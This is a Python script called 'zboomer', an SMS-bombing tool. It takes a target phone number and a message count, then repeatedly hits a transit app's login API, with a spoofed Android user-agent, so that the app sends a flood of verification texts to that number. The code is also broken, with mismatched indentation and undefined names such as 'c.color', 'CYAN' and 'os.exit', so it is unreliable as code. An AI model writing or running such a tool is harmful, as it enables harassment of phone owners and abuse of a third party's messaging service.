try:
	from tqdm import tqdm
	import requests, os
	from colorama import Fore as c
except Exception as error:
	os.system('pip install tqdm')
	os.system('pip install colorama')
	os.system('pip install requests')

def banner():
	os.system('cls')
	print(c.GREEN + """
			____   ____   ____  __  __ ______ _____  
		   |  _ \ / __ \ / __ \|  \/  |  ____|  __ \ 
	  ____ | |_) | |  | | |  | | \  / | |__  | |__) |
	 |_  / |  _ <| |  | | |  | | |\/| |  __| |  _  / 
	  / /  | |_) | |__| | |__| | |  | | |____| | \ \ 
	 /___| |____/ \____/ \____/|_|  |_|______|_|  \_\                                             
	""")
	print('   for get help write this "zboomer -h"')

def helplist(color):
     print(c.color + '''
     
 -h       for get information about command
 -s       to send sms for target
 -q       to exit from tool
''')

def smsboomer():
     headers = ({'User-Agent':
                'Token Transit/4.2.4 (Android 9; sdk 28; gzip) okhttp'})
    phoneNumber = input("Enter phone number: ")
    phoneNumber = str(phoneNumber)
    url = "https://api.tokentransit.com/v1/user/login?env=live&phone_number=%2B1%20"+phoneNumber
    numofmsgs = int(input("Enter number of messages to send: "))
    successspamCount = 0
    failspamCount = 0
    for i in tqdm(range(numofmsgs)):
    resp = requests.get(url)
    if resp.status_code == 200:
        successspamCount = successspamCount + 1
    else:
        failspamCount = failspamCount + 1
        print("Total successful messages sent: ",  successspamCount)
        print("Total failed messages sent: ", failspamCount)

                   

     
def terminal():
	banner()
    while True:
         result = input(' zboomer\root\ $ ')
          
         if result == 'zboomer -s':
              smsboomer()
               
         elif result == 'zboomer -h':
              helplist(CYAN)

         elif result == 'zboomer -q':
              print('good luck!')
              os.exit()
			
terminal()

